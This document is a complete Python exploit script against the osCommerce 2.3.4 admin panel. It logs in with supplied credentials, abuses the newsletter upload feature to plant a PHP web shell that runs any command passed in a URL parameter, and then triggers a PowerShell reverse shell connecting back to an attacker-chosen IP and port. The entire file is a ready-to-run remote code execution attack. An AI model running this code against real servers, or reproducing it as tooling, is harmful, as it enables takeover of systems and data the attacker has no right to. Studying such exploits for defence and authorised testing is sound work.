import argparse
import urllib.parse
import sys
import requests
from log_colors import *
requests.packages.urllib3.disable_warnings()

# osCommerce v2.3.4 Arbitrary File Upload + RCE
class osCommerceRCE:
    DEFAULT_ADMIN_URL = "/catalog/admin/"

    def __init__(self, url, username, passwd, lhost, lport):
        self.url = url.rstrip("/") + self.DEFAULT_ADMIN_URL.rstrip("/")
        self.username, self.passwd = username, passwd
        self.lhost, self.lport = lhost, lport
        self.filename = "/tmp/shell.php"
        self.session = requests.Session()

    # login with creds
    def login(self):
        print (LogColors.BLUE + "login..." + LogColors.ENDC)
        self.session.get(self.url + "/login.php", allow_redirects = False)
        params = {'action': "process"}
        data = {"username": self.username, "password": self.passwd}

        try:
            r = self.session.post(self.url + "/login.php", data = data, params = params, allow_redirects = False)
        except Exception as e:
            print (LogColors.RED + "failed to login :(" + LogColors.ENDC)
            sys.exit()
        else:
            if r.status_code == 302:
                print (LogColors.YELLOW + "successfully login..." + LogColors.ENDC)
            else:
                print (LogColors.RED + "failed to login :(" + LogColors.ENDC)
                sys.exit()
    
    # prepare webshell file
    def prepare_shell_php(self):
        print (LogColors.BLUE + "prepare web shell..." + LogColors.ENDC)
        with open(self.filename, "w+") as f:
            f.write('<html>\n')
            f.write('<body>\n')
            f.write('<form method="GET" name="<?php echo basename($_SERVER[\'PHP_SELF\']); ?>">\n')
            f.write('<input type="TEXT" name="cmd" id="cmd" size="80">\n')
            f.write('<input type="SUBMIT" value="Execute">\n')
            f.write('</form>\n')
            f.write('<pre>\n')
            f.write('<?php\n')
            f.write("if(isset($_GET['cmd']))\n")
            f.write('{\n')
            f.write("exec($_GET['cmd']);\n")
            f.write("}\n")
            f.write("?>\n")
            f.write("</pre>\n")
            f.write('</body>\n')
            f.write('<script>document.getElementById("cmd").focus();</script>\n')
            f.write('</html>\n')
        print (LogColors.GREEN + "successfully create php shell" + LogColors.ENDC)

    # upload shell.php script
    def upload_file(self):
        print (LogColors.BLUE + "upload file (php web shell)..." + LogColors.ENDC)
        newsletter_url = self.url + "/newsletters.php"
        r = self.session.get(newsletter_url, params = {"action" : "new"})

        payload = {
            'module': 'upload',
            'title': 'hacked',
            'content': './'
        }

        params = {"action" : "insert"}
        r = self.session.post(newsletter_url, params = params, data = payload, allow_redirects = False)
        try:
            newsletter_id = urllib.parse.urlparse(r.headers['Location']).query[4:]
        except:
            print (LogColors.RED + "failed to create new newsletter :(" + LogColors.ENDC)
            exit()
        else:
            print (LogColors.YELLOW + "newsletter ID: " + newsletter_id  + LogColors.ENDC)
            print (LogColors.YELLOW + "successfully create newsletter..." + LogColors.ENDC)

        lock_params = {"action" : "lock", "nID" : newsletter_id}
        try:
            r = self.session.post(newsletter_url, params = lock_params)
        except Exception as e:
            print (LogColors.RED + "failed to lock the newsletter" + LogColors.ENDC)
            sys.exit()
        else:
            print (LogColors.YELLOW + "successfully locked the newsletter, upload.." + LogColors.ENDC)

        files = {
            'hacked' : open(self.filename),
        }

        send_params = {"action" : "send", "nID" : newsletter_id }
        try:
            r = self.session.post(newsletter_url, params = send_params, files = files)
        except Exception:
            print (LogColors.RED + "failed to upload the file :(" + LogColors.ENDC)
            sys.exit()
        else:
            if r.ok:
                print (LogColors.GREEN + "successfully upload the file :)" + LogColors.ENDC)
            else:
                print (LogColors.RED + "failed to upload the file :(" + LogColors.ENDC)
                sys.exit()

    # verify uploaded file
    def verify_upload(self):
        print (LogColors.BLUE + "verify that the file uploaded..." + LogColors.ENDC)
        shell_url = self.url + "/" + self.filename.split("/")[-1]
        try:
            r = requests.get(shell_url)
        except Exception as e:
            print (LogColors.RED + "failed to verify uploaded file..." + LogColors.ENDC)
            sys.exit()
        else:
            if r.ok:
                self.shell_url = shell_url
                print (LogColors.GREEN + "file url: "+ shell_url + LogColors.ENDC)
            else:
                print (LogColors.RED + "failed to verify uploaded file..." + LogColors.ENDC)
                sys.exit()
    
    # prepare powershell reverse shell
    def prepare_rev_shell(self):
        print (LogColors.BLUE + "prepare reverse shell payload..." + LogColors.ENDC)
        shell = '''powershell -nop -c "$client = New-Object System.Net.Sockets.'''
        shell += "TCPClient('" + self.lhost + "'," + self.lport + ");"
        shell += '''$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );'''
        shell += """$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};"""
        shell += '''$client.Close()"'''

        self.rev_shell = shell
        print (LogColors.YELLOW + shell + LogColors.ENDC)
        print (LogColors.GREEN + "successfully create reverse shell payload..." + LogColors.ENDC)


    def trigger_rev_shell(self):
        print (LogColors.BLUE + "trigger reverse shell..." + LogColors.ENDC)
        rev_shell = urllib.parse.quote_plus(self.rev_shell)
        url = self.shell_url + "?cmd=" + rev_shell
        print (LogColors.YELLOW + url + LogColors.ENDC)
        r = requests.get(url)
        print (LogColors.GREEN + "successfully trigger reverse shell payload :)" + LogColors.ENDC)

    def exploit(self):
        self.prepare_shell_php()
        self.login()
        self.upload_file()
        self.verify_upload()
        self.prepare_rev_shell()
        self.trigger_rev_shell()

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url', required = True, help = "target url")
    parser.add_argument('-U','--username', required = True, help = "auth username")
    parser.add_argument('-P','--password', required = True, help = "auth password")
    parser.add_argument('-i','--ip', required = True, help = "revshell listener ip")
    parser.add_argument('-p','--port', required = True, help = "revshell listener port")
    args = vars(parser.parse_args())
    url = args['url']
    uname, pwd = args['username'], args['password']
    ip, port = args['ip'], args['port']
    cve = osCommerceRCE(url, uname, pwd, ip, port)
    cve.exploit()


